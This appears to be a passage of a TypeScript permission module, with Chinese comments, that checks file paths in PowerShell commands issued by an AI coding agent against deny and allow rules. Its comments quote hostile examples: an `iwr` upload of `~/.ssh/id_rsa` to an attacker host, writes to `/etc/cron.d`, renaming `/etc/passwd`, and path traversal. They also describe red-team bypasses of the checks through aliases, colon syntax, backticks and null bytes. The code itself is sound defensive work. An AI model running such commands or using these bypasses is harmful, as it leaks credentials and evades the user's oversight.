/**
 * 针对 PowerShell 命令参数的路径验证。
 *
 * 使用 AST 解析器从 PowerShell 命令中提取文件路径，
 * 并验证它们保持在允许的项目目录内。
 * 遵循与 BashTool/pathValidation.ts 相同的模式。
 */

import { homedir } from 'os'
import { isAbsolute, resolve } from 'path'
import type { ToolPermissionContext } from 'src/Tool.js'
import type { PermissionRule } from 'src/types/permissions.js'
import { getCwd } from 'src/utils/cwd.js'
import { getFsImplementation, safeResolvePath } from 'src/utils/fsOperations.js'
import { containsPathTraversal, getDirectoryForPath } from 'src/utils/path.js'
import {
  allWorkingDirectories,
  checkEditableInternalPath,
  checkPathSafetyForAutoEdit,
  checkReadableInternalPath,
  matchingRuleForInput,
  pathInAllowedWorkingPath,
} from 'src/utils/permissions/filesystem.js'
import type { PermissionResult } from 'src/utils/permissions/PermissionResult.js'
import { createReadRuleSuggestion } from 'src/utils/permissions/PermissionUpdate.js'
import type { PermissionUpdate } from 'src/utils/permissions/PermissionUpdateSchema.js'
import {
  isDangerousRemovalPath,
  isPathInSandboxWriteAllowlist,
} from 'src/utils/permissions/pathValidation.js'
import { getPlatform } from 'src/utils/platform.js'
import type {
  ParsedCommandElement,
  ParsedPowerShellCommand,
} from 'src/utils/powershell/parser.js'
import {
  isNullRedirectionTarget,
  isPowerShellParameter,
} from 'src/utils/powershell/parser.js'
import { COMMON_SWITCHES, COMMON_VALUE_PARAMS } from './commonParameters.js'
import { resolveToCanonical } from './readOnlyValidation.js'

const MAX_DIRS_TO_LIST = 5
// PowerShell 通配符只有 * ? [ ] — 花括号是字面字符
//（无花括号展开）。包含 {} 会通过 glob 基截断而非完整路径符号链接解析
// 错误路由像 `./{x}/passwd` 这样的路径。
const GLOB_PATTERN_REGEX = /[*?[\]]/

type FileOperationType = 'read' | 'write' | 'create'

type PathCheckResult = {
  allowed: boolean
  decisionReason?: import('src/utils/permissions/PermissionResult.js').PermissionDecisionReason
}

type ResolvedPathCheckResult = PathCheckResult & {
  resolvedPath: string
}

/**
 * 每个 cmdlet 的参数配置。
 *
 * 每个条目声明：
 *   - operationType：此 cmdlet 是读取还是写入文件系统
 *   - pathParams：接受文件路径的参数（针对允许的目录验证）
 *   - knownSwitches：开关参数（不接受值）— 下一个参数不被消费
 *   - knownValueParams：接受值的非路径参数 — 下一个参数被消费
 *     但不作为路径验证（例如 -Encoding UTF8、-Filter *.txt）
 *
 * 安全模型：任何不在这三组中的 -Param 会强制
 * hasUnvalidatablePathArg → 询问。这结束了 KNOWN_SWITCH_PARAMS 的打地鼠
 * 问题，每个缺失的开关都导致未知参数启发式吞下
 * 下一个参数（可能是位置路径）。现在，Tier 2 cmdlet 只在我们完全理解的调用时
 * 才自动允许。
 *
 * 来源：
 *   - Windows PowerShell 5.1 上的 (Get-Command <cmdlet>).Parameters
 *   - 官方文档中的 PS 6+ 新增（例如 -AsByteStream、-NoEmphasis）
 *
 * 注意：通用参数（-Verbose、-ErrorAction 等）不在此列出；
 * 它们在查找时从 COMMON_SWITCHES / COMMON_VALUE_PARAMS 合并。
 *
 * 参数名以小写带前导横杠存储，以匹配运行时比较。
 */
type CmdletPathConfig = {
  operationType: FileOperationType
  /** 接受文件路径的参数名（针对允许的目录验证） */
  pathParams: string[]
  /** 不接受值的开关参数（下一个参数不被消费） */
  knownSwitches: string[]
  /** 接受值但不是路径的参数（下一个参数被消费，但不做路径验证） */
  knownValueParams: string[]
  /**
   * 接受由 PowerShell 相对于另一个参数（非 cwd）解析的叶子文件名的参数名。
   * 仅当值是简单叶子（无 `/`、`\`、`.`、`..`）时才安全提取。非叶子值
   * 被标记为不可验证，因为 validatePath 相对 cwd 解析，而非
   * 实际基础 — 连接 -Path 需要跨参数
   * 跟踪。
   */
  leafOnlyPathParams?: string[]
  /**
   * 要跳过的前导位置参数数量（不作为路径提取）。
   * 用于位置 0 是非路径值的 cmdlet — 例如，
   * Invoke-WebRequest 的位置 -Uri 是 URL，而非本地文件系统路径。
   * 没有此项，`iwr http://example.com` 会将 `http://example.com` 提取为
   * 路径，并且 validatePath 的 provider-path 正则（^[a-z]{2,}:）会在
   * URL scheme 上误触发，显示令人困惑的"非文件系统 provider"消息。
   */
  positionalSkip?: number
  /**
   * 当为 true 时，此 cmdlet 仅在存在 pathParam 时写入磁盘。
   * 没有路径（例如没有 -OutFile 的 `Invoke-WebRequest https://example.com`），
   * 它实际上是读操作 — 输出到管道，
   * 而非文件系统。跳过"写入无目标路径"的强制询问。
   * 总是写入的 cmdlet 如 Set-Content 不应设置此项。
   */
  optionalWrite?: boolean
}

const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
  // ─── 写入/创建操作 ─────────────────────────────────────────────
  'set-content': {
    operationType: 'write',
    // -PSPath 和 -LP 是所有 provider cmdlet 上 -LiteralPath 的运行时别名。
    // 没有它们，冒号语法（-PSPath:/etc/x）落入
    // 未知参数分支 → 路径被困 → paths=[] → 拒绝从未咨询。
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-passthru',
      '-force',
      '-whatif',
      '-confirm',
      '-usetransaction',
      '-nonewline',
      '-asbytestream', // PS 6+
    ],
    knownValueParams: [
      '-value',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-encoding',
      '-stream',
    ],
  },
  'add-content': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-passthru',
      '-force',
      '-whatif',
      '-confirm',
      '-usetransaction',
      '-nonewline',
      '-asbytestream', // PS 6+
    ],
    knownValueParams: [
      '-value',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-encoding',
      '-stream',
    ],
  },
  'remove-item': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-recurse',
      '-force',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-stream',
    ],
  },
  'clear-content': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-stream',
    ],
  },
  // Out-File/Tee-Object/Export-Csv/Export-Clixml 缺失，因此路径级
  // 拒绝规则（Edit(/etc/**)）硬阻止 `Set-Content /etc/x`，但只
  // 对 `Out-File /etc/x` *询问*。这四个都是接受文件路径位置的写入 cmdlet。
  'out-file': {
    operationType: 'write',
    // Out-File 使用 -FilePath（位置 0）。-Path 是 PowerShell 文档化的
    // -FilePath 别名 — 必须在 pathParams 中，否则 `Out-File -Path:./x`
    //（冒号语法，单个 token）落入未知参数 → 值被困 →
    // paths=[] → Edit 拒绝从未咨询 → 询问（安全失败但拒绝降级）。
    pathParams: ['-filepath', '-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-append',
      '-force',
      '-noclobber',
      '-nonewline',
      '-whatif',
      '-confirm',
    ],
    knownValueParams: ['-inputobject', '-encoding', '-width'],
  },
  'tee-object': {
    operationType: 'write',
    // Tee-Object 使用 -FilePath（位置 0，别名：-Path）。-Variable 不是路径。
    pathParams: ['-filepath', '-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-append'],
    knownValueParams: ['-inputobject', '-variable', '-encoding'],
  },
  'export-csv': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-append',
      '-force',
      '-noclobber',
      '-notypeinformation',
      '-includetypeinformation',
      '-useculture',
      '-noheader',
      '-whatif',
      '-confirm',
    ],
    knownValueParams: [
      '-inputobject',
      '-delimiter',
      '-encoding',
      '-quotefields',
      '-usequotes',
    ],
  },
  'export-clixml': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-noclobber', '-whatif', '-confirm'],
    knownValueParams: ['-inputobject', '-depth', '-encoding'],
  },
  // New-Item/Copy-Item/Move-Item 缺失：`mkdir /etc/cron.d/evil` →
  // resolveToCanonical('mkdir') = 'new-item' 通过 COMMON_ALIASES → 不在
  // config 中 → 早返回 {paths:[], 'read'} → Edit 拒绝从未咨询。
  //
  // Copy-Item/Move-Item 有双重路径参数（-Path 源，-Destination
  // 目标）。operationType:'write' 不完美 — 源语义上是读 —
  // 但这意味着两个路径都获得 Edit 拒绝验证，这严格上比两个都不提取更安全。
  // 每参数 operationType 会理想，但那是更大的 schema 变更；
  // 笨拙的 'write' 现在就关闭差距。
  'new-item': {
    operationType: 'write',
    // -Path 是位置 0。-Name（位置 1）由 PowerShell 相对 -Path 解析
    //（根据 MS 文档："你可以在 Name 中指定新项的路径"），
    // 包括 `..` 遍历。我们针对 CWD 解析
    //（validatePath L930），而非 -Path — 因此 `New-Item -Path /allowed
    // -Name ../secret/evil` 创建 /allowed/../secret/evil = /secret/evil，
    // 但我们解析 cwd/../secret/evil，它落在别处并可能错过
    // 拒绝规则。这是拒绝→询问降级，不是安全失败。
    //
    // -name 在 leafOnlyPathParams 中：简单叶子文件名（`foo.txt`）被
    // 提取（解析为 cwd/foo.txt — 略错，但 -Path 提取覆盖
    // 目录，叶子无法遍历）；
    // 任何带 `/`、`\`、`.`、`..` 的值标记 hasUnvalidatablePathArg →
    // 询问。将 -Name 连接到 -Path 是正确的，但需要
    // 跨参数跟踪 — 超出此范围。
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    leafOnlyPathParams: ['-name'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: ['-itemtype', '-value', '-credential', '-type'],
  },
  'copy-item': {
    operationType: 'write',
    // -Path（位置 0）是源，-Destination（位置 1）是目标。
    // 两者都提取；两者都作为写入验证。
    pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destination'],
    knownSwitches: [
      '-container',
      '-force',
      '-passthru',
      '-recurse',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-fromsession',
      '-tosession',
    ],
  },
  'move-item': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destination'],
    knownSwitches: [
      '-force',
      '-passthru',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: ['-filter', '-include', '-exclude', '-credential'],
  },
  // rename-item/set-item：同一类 — COMMON_ALIASES 中的 ren/rni/si，两者都
  // 不在 config 中。`ren /etc/passwd passwd.bak` → 解析为 rename-item
  // → 不在 config 中 → {paths:[], 'read'} → Edit 拒绝被绕过。这关闭
  // COMMON_ALIASES→CMDLET_PATH_CONFIG 覆盖审计：每个
  // 写入 cmdlet 别名现在都解析到 config 条目。
  'rename-item': {
    operationType: 'write',
    // -Path 位置 0，-NewName 位置 1。-NewName 仅叶子（文档：
    //"你不能指定新驱动器或不同路径"）并且 Rename-Item
    // 显式拒绝其中的 `..` — 因此 knownValueParams 在这里正确，
    // 与接受遍历的 New-Item -Name 不同。
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-force',
      '-passthru',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-newname',
      '-credential',
      '-filter',
      '-include',
      '-exclude',
    ],
  },
  'set-item': {
    operationType: 'write',
    // FileSystem provider 对 Set-Item 内容抛出 NotSupportedException，
    // 因此实际写入面是注册表/env/function/alias provider。
    // Provider 限定路径（HKLM:\\、Env:\\）在
    // powershellPermissions.ts 步骤 3.5 独立捕获，但在此处将 set-item 分类为写入
    // 是纵深防御 — powershellSecurity.ts:379 已经在
    // ENV_WRITE_CMDLETS 中列出它；这使 pathValidation 一致。
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-force',
      '-passthru',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-value',
      '-credential',
      '-filter',
      '-include',
      '-exclude',
    ],
  },
  // ─── 读操作 ─────────────────────────────────────────────
  'get-content': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-force',
      '-usetransaction',
      '-wait',
      '-raw',
      '-asbytestream', // PS 6+
    ],
    knownValueParams: [
      '-readcount',
      '-totalcount',
      '-tail',
      '-first', // -TotalCount 的别名
      '-head', // -TotalCount 的别名
      '-last', // -Tail 的别名
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-delimiter',
      '-encoding',
      '-stream',
    ],
  },
  'get-childitem': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-recurse',
      '-force',
      '-name',
      '-usetransaction',
      '-followsymlink',
      '-directory',
      '-file',
      '-hidden',
      '-readonly',
      '-system',
    ],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-depth',
      '-attributes',
      '-credential',
    ],
  },
  'get-item': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-usetransaction'],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-stream',
    ],
  },
  'get-itemproperty': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-usetransaction'],
    knownValueParams: [
      '-name',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
    ],
  },
  'get-itempropertyvalue': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-usetransaction'],
    knownValueParams: [
      '-name',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
    ],
  },
  'get-filehash': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [],
    knownValueParams: ['-algorithm', '-inputstream'],
  },
  'get-acl': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-audit', '-allcentralaccesspolicies', '-usetransaction'],
    knownValueParams: ['-inputobject', '-filter', '-include', '-exclude'],
  },
  'format-hex': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-raw'],
    knownValueParams: [
      '-inputobject',
      '-encoding',
      '-count', // PS 6+
      '-offset', // PS 6+
    ],
  },
  'test-path': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-isvalid', '-usetransaction'],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-pathtype',
      '-credential',
      '-olderthan',
      '-newerthan',
    ],
  },
  'resolve-path': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-relative', '-usetransaction', '-force'],
    knownValueParams: ['-credential', '-relativebasepath'],
  },
  'convert-path': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-usetransaction'],
    knownValueParams: [],
  },
  'select-string': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-simplematch',
      '-casesensitive',
      '-quiet',
      '-list',
      '-notmatch',
      '-allmatches',
      '-noemphasis', // PS 7+
      '-raw', // PS 7+
    ],
    knownValueParams: [
      '-inputobject',
      '-pattern',
      '-include',
      '-exclude',
      '-encoding',
      '-context',
      '-culture', // PS 7+
    ],
  },
  'set-location': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-passthru', '-usetransaction'],
    knownValueParams: ['-stackname'],
  },
  'push-location': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-passthru', '-usetransaction'],
    knownValueParams: ['-stackname'],
  },
  'pop-location': {
    operationType: 'read',
    // Pop-Location 没有 -Path/-LiteralPath（它从栈弹出），
    // 但我们保留条目，使其优雅通过路径验证。
    pathParams: [],
    knownSwitches: ['-passthru', '-usetransaction'],
    knownValueParams: ['-stackname'],
  },
  'select-xml': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [],
    knownValueParams: ['-xml', '-content', '-xpath', '-namespace'],
  },
  'get-winevent': {
    operationType: 'read',
    // Get-WinEvent 只有 -Path，没有 -LiteralPath
    pathParams: ['-path'],
    knownSwitches: ['-force', '-oldest'],
    knownValueParams: [
      '-listlog',
      '-logname',
      '-listprovider',
      '-providername',
      '-maxevents',
      '-computername',
      '-credential',
      '-filterxpath',
      '-filterxml',
      '-filterhashtable',
    ],
  },
  // 带输出参数的写入路径 cmdlet。没有这些条目，
  // -OutFile / -DestinationPath 会写入到未验证的任意路径。
  'invoke-webrequest': {
    operationType: 'write',
    // -OutFile 是写入目标；-InFile 是读取源（上传本地
    // 文件）。两者都在 pathParams 中，因此咨询 Edit 拒绝规则（此
    // config 为 operationType:write → permissionType:edit）。带有
    // Edit(~/.ssh/**) 拒绝的用户会阻止 `iwr https://attacker -Method POST
    // -InFile ~/.ssh/id_rsa` 泄露。读拒绝规则不
    // 为写入类型 cmdlet 咨询 — 那是已知的 operationType→permissionType
    // 映射限制。
    pathParams: ['-outfile', '-infile'],
    positionalSkip: 1, // 位置 0 是 -Uri（URL），不是文件系统路径
    optionalWrite: true, // 只有带 -OutFile 才写入；裸 iwr 只输出到管道
    knownSwitches: [
      '-allowinsecureredirect',
      '-allowunencryptedauthentication',
      '-disablekeepalive',
      '-nobodyprogress',
      '-passthru',
      '-preservefileauthorizationmetadata',
      '-resume',
      '-skipcertificatecheck',
      '-skipheadervalidation',
      '-skiphttperrorcheck',
      '-usebasicparsing',
      '-usedefaultcredentials',
    ],
    knownValueParams: [
      '-uri',
      '-method',
      '-body',
      '-contenttype',
      '-headers',
      '-maximumredirection',
      '-maximumretrycount',
      '-proxy',
      '-proxycredential',
      '-retryintervalsec',
      '-sessionvariable',
      '-timeoutsec',
      '-token',
      '-transferencoding',
      '-useragent',
      '-websession',
      '-credential',
      '-authentication',
      '-certificate',
      '-certificatethumbprint',
      '-form',
      '-httpversion',
    ],
  },
  'invoke-restmethod': {
    operationType: 'write',
    // -OutFile 是写入目标；-InFile 是读取源（上传本地
    // 文件）。两者必须在 pathParams 中，以便咨询拒绝规则。
    pathParams: ['-outfile', '-infile'],
    positionalSkip: 1, // 位置 0 是 -Uri（URL），不是文件系统路径
    optionalWrite: true, // 只有带 -OutFile 才写入；裸 irm 只输出到管道
    knownSwitches: [
      '-allowinsecureredirect',
      '-allowunencryptedauthentication',
      '-disablekeepalive',
      '-followrellink',
      '-nobodyprogress',
      '-passthru',
      '-preservefileauthorizationmetadata',
      '-resume',
      '-skipcertificatecheck',
      '-skipheadervalidation',
      '-skiphttperrorcheck',
      '-usebasicparsing',
      '-usedefaultcredentials',
    ],
    knownValueParams: [
      '-uri',
      '-method',
      '-body',
      '-contenttype',
      '-headers',
      '-maximumfollowrellink',
      '-maximumredirection',
      '-maximumretrycount',
      '-proxy',
      '-proxycredential',
      '-responseheaderstvariable',
      '-retryintervalsec',
      '-sessionvariable',
      '-statuscodevariable',
      '-timeoutsec',
      '-token',
      '-transferencoding',
      '-useragent',
      '-websession',
      '-credential',
      '-authentication',
      '-certificate',
      '-certificatethumbprint',
      '-form',
      '-httpversion',
    ],
  },
  'expand-archive': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destinationpath'],
    knownSwitches: ['-force', '-passthru', '-whatif', '-confirm'],
    knownValueParams: [],
  },
  'compress-archive': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destinationpath'],
    knownSwitches: ['-force', '-update', '-passthru', '-whatif', '-confirm'],
    knownValueParams: ['-compressionlevel'],
  },
  // *-ItemProperty cmdlet：主要用途是注册表 provider（在键下设置/新建/
  // 删除注册表值）。Provider 限定路径（HKLM:\、
  // HKCU:\）在 powershellPermissions.ts 步骤 3.5 独立捕获。
  // 此处的条目是为 Edit 拒绝规则咨询的纵深防御，与
  // set-item 的理由对称。
  'set-itemproperty': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-passthru',
      '-force',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-name',
      '-value',
      '-type',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-inputobject',
    ],
  },
  'new-itemproperty': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: [
      '-name',
      '-value',
      '-propertytype',
      '-type',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
    ],
  },
  'remove-itemproperty': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: [
      '-name',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
    ],
  },
  'clear-item': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: ['-filter', '-include', '-exclude', '-credential'],
  },
  'export-alias': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-append',
      '-force',
      '-noclobber',
      '-passthru',
      '-whatif',
      '-confirm',
    ],
    knownValueParams: ['-name', '-description', '-scope', '-as'],
  },
}

/**
 * 检查小写参数名（带前导横杠）是否匹配给定参数列表中的任何条目，
 * 考虑 PowerShell 的前缀匹配行为
 *（例如 -Lit 匹配 -LiteralPath）。
 */
function matchesParam(paramLower: string, paramList: string[]): boolean {
  for (const p of paramList) {
    if (
      p === paramLower ||
      (paramLower.length > 1 && p.startsWith(paramLower))
    ) {
      return true
    }
  }
  return false
}

/**
 * 当冒号语法值包含掩盖真实运行时路径的表达式构造（数组、子表达式、
 * 变量、反引号转义）时返回 true。外部 CommandParameterAst 的 'Parameter'
 * 元素类型将这些从我们的 AST 遍历中隐藏，因此我们必须按文本检测它们。
 *
 * 在 extractPathsFromCommand 的三个分支中使用：pathParams、
 * leafOnlyPathParams 和未知参数纵深防御分支。
 */
function hasComplexColonValue(rawValue: string): boolean {
  return (
    rawValue.includes(',') ||
    rawValue.startsWith('(') ||
    rawValue.startsWith('[') ||
    rawValue.includes('`') ||
    rawValue.includes('@(') ||
    rawValue.startsWith('@{') ||
    rawValue.includes('$')
  )
}

function formatDirectoryList(directories: string[]): string {
  const dirCount = directories.length
  if (dirCount <= MAX_DIRS_TO_LIST) {
    return directories.map(dir => `'${dir}'`).join(', ')
  }
  const firstDirs = directories
    .slice(0, MAX_DIRS_TO_LIST)
    .map(dir => `'${dir}'`)
    .join(', ')
  return `${firstDirs}，以及其他 ${dirCount - MAX_DIRS_TO_LIST} 个`
}

/**
 * 将路径开头的波浪号（~）展开为用户主目录。
 */
function expandTilde(filePath: string): string {
  if (
    filePath === '~' ||
    filePath.startsWith('~/') ||
    filePath.startsWith('~\\')
  ) {
    return homedir() + filePath.slice(1)
  }
  return filePath
}

/**
 * 检查原始用户提供的路径（realpath 之前）是否有危险的删除目标。
 * safeResolvePath/realpathSync 以击败 isDangerousRemovalPath 的方式规范化：
// 在 Windows '/' → 'C:\'（无法通过 === '/' 检查）；
// 在 macOS homedir() 可能在 /var 下，realpathSync 重写为
// /private/var（无法通过 === homedir() 检查）。检查波浪号展开、
// 反斜杠规范化的形式捕获危险形态（/、~、/etc、/usr），
// 正如用户键入的那样。
 */
export function isDangerousRemovalRawPath(filePath: string): boolean {
  const expanded = expandTilde(filePath.replace(/^['"]|['"]$/g, '')).replace(
    /\\/g,
    '/',
  )
  return isDangerousRemovalPath(expanded)
}

export function dangerousRemovalDeny(path: string): PermissionResult {
  return {
    behavior: 'deny',
    message: `系统路径 '${path}' 上的 Remove-Item 被阻止。此路径受保护，无法删除。`,
    decisionReason: {
      type: 'other',
      reason: '删除目标为受保护的系统路径',
    },
  }
}

/**
 * 检查解析后的路径在给定操作类型下是否被允许。
 * 镜像 BashTool/pathValidation.ts 中 isPathAllowed 的逻辑。
 */
function isPathAllowed(
  resolvedPath: string,
  context: ToolPermissionContext,
  operationType: FileOperationType,
  precomputedPathsToCheck?: readonly string[],
): PathCheckResult {
  const permissionType = operationType === 'read' ? 'read' : 'edit'

  // 1. 先检查拒绝规则
  const denyRule = matchingRuleForInput(
    resolvedPath,
    context,
    permissionType,
    'deny',
  )
  if (denyRule !== null) {
    return {
      allowed: false,
      decisionReason: { type: 'rule', rule: denyRule },
    }
  }

  // 2. 对于写入/创建操作，检查内部可编辑路径（plan 文件、scratchpad、agent memory、job 目录）
  // 这必须在 checkPathSafetyForAutoEdit 之前，因为 .hclaude 是危险目录
  // 而内部可编辑路径位于 ~/.hclaude/ 下 — 匹配
  // checkWritePermissionForTool（filesystem.ts 步骤 1.5）中的顺序
  if (operationType !== 'read') {
    const internalEditResult = checkEditableInternalPath(resolvedPath, {})
    if (internalEditResult.behavior === 'allow') {
      return {
        allowed: true,
        decisionReason: internalEditResult.decisionReason,
      }
    }
  }

  // 2.5. 对于写入/创建操作，检查安全验证
  if (operationType !== 'read') {
    const safetyCheck = checkPathSafetyForAutoEdit(
      resolvedPath,
      precomputedPathsToCheck,
    )
    if (!safetyCheck.safe) {
      return {
        allowed: false,
        decisionReason: {
          type: 'safetyCheck',
          reason: (
            safetyCheck as {
              safe: false
              message: string
              classifierApprovable: boolean
            }
          ).message,
          classifierApprovable: (
            safetyCheck as {
              safe: false
              message: string
              classifierApprovable: boolean
            }
          ).classifierApprovable,
        },
      }
    }
  }

  // 3. 检查路径是否在允许的工作目录中
  const isInWorkingDir = pathInAllowedWorkingPath(
    resolvedPath,
    context,
    precomputedPathsToCheck,
  )
  if (isInWorkingDir) {
    if (operationType === 'read' || context.mode === 'acceptEdits') {
      return { allowed: true }
    }
  }

  // 3.5. 对于读操作，检查内部可读路径
  if (operationType === 'read') {
    const internalReadResult = checkReadableInternalPath(resolvedPath, {})
    if (internalReadResult.behavior === 'allow') {
      return {
        allowed: true,
        decisionReason: internalReadResult.decisionReason,
      }
    }
  }

  // 3.7. 对于工作目录外路径的写入/创建操作，
  // 检查沙箱写入白名单。当启用沙箱时，用户已
  // 显式配置可写目录（例如 /tmp/claude/）— 将这些视为额外的允许写入目录，
  // 使重定向/Out-File/New-Item 不会不必要地提示。工作目录中的路径被
  // 排除：沙箱白名单总是种子 '.'（cwd），它会
  // 绕过步骤 3 的 acceptEdits 门。
  if (
    operationType !== 'read' &&
    !isInWorkingDir &&
    isPathInSandboxWriteAllowlist(resolvedPath)
  ) {
    return {
      allowed: true,
      decisionReason: {
        type: 'other',
        reason: '路径在沙箱写入白名单中',
      },
    }
  }

  // 4. 检查允许规则
  const allowRule = matchingRuleForInput(
    resolvedPath,
    context,
    permissionType,
    'allow',
  )
  if (allowRule !== null) {
    return {
      allowed: true,
      decisionReason: { type: 'rule', rule: allowRule },
    }
  }

  // 5. 路径不被允许
  return { allowed: false }
}

/**
 * 对被 :: 或反引号语法掩盖的路径进行尽力而为的拒绝检查。
 * 只检查拒绝规则 — 从不自动允许。如果剥离的猜测
 * 不匹配拒绝规则，我们像以前一样回退到询问。
 */
function checkDenyRuleForGuessedPath(
  strippedPath: string,
  cwd: string,
  toolPermissionContext: ToolPermissionContext,
  operationType: FileOperationType,
): { resolvedPath: string; rule: PermissionRule } | null {
  // 红队 P7：null 字节使 expandPath 抛出。既存问题，但
  // 在此处防御，因为我们正在引入新的调用路径。
  if (!strippedPath || strippedPath.includes('\0')) return null
  // 红队 P3：`~/.ssh/x 剥离为 ~/.ssh/x 但 expandTilde 只在
  // 前导 ~ 上触发 — 反引号在它前面。在此重新运行。
  const tildeExpanded = expandTilde(strippedPath)
  const abs = isAbsolute(tildeExpanded)
    ? tildeExpanded
    : resolve(cwd, tildeExpanded)
  const { resolvedPath } = safeResolvePath(getFsImplementation(), abs)
  const permissionType = operationType === 'read' ? 'read' : 'edit'
  const denyRule = matchingRuleForInput(
    resolvedPath,
    toolPermissionContext,
    permissionType,
    'deny',
  )
  return denyRule ? { resolvedPath, rule: denyRule } : null
}

/**
 * 验证文件系统路径，处理波浪号展开。
 */
function validatePath(
  filePath: string,
  cwd: string,
  toolPermissionContext: ToolPermissionContext,
  operationType: FileOperationType,
): ResolvedPathCheckResult {
  // 如果存在外围引号则移除
  const cleanPath = expandTilde(filePath.replace(/^['"]|['"]$/g, ''))

  // 安全检查：PowerShell Core 在所有平台上将反斜杠规范化为正斜杠，
  // 但 Linux/Mac 上的 path.resolve 将它们视为字面字符。
  // 在解析之前规范化，以便像 dir\..\..\etc\shadow 这样的遍历模式
  // 被正确检测到。
  const normalizedPath = cleanPath.replace(/\\/g, '/')

  // 安全检查：反引号（`）是 PowerShell 的转义字符。它在许多位置
  // 是无操作的（例如 `/ === /）但会击败 Node.js 路径检查如
  // isAbsolute()。重定向目标使用原始 .Extent.Text，保留
  // 反引号转义。将任何包含反引号的路径视为不可验证。
  if (normalizedPath.includes('`')) {
    // 红队 P3：反引号已为 StringConstant 参数解析
    //（解析器使用 .value）；此防护主要为重定向
    // 目标触发，它们使用原始 .Extent.Text。剥离对大多数特殊
    // 转义（`n → n）是无操作的，但没关系 — 错误猜测 → 无拒绝匹配 →
    // 回退到询问。
    const backtickStripped = normalizedPath.replace(/`/g, '')
    const denyHit = checkDenyRuleForGuessedPath(
      backtickStripped,
      cwd,
      toolPermissionContext,
      operationType,
    )
    if (denyHit) {
      return {
        allowed: false,
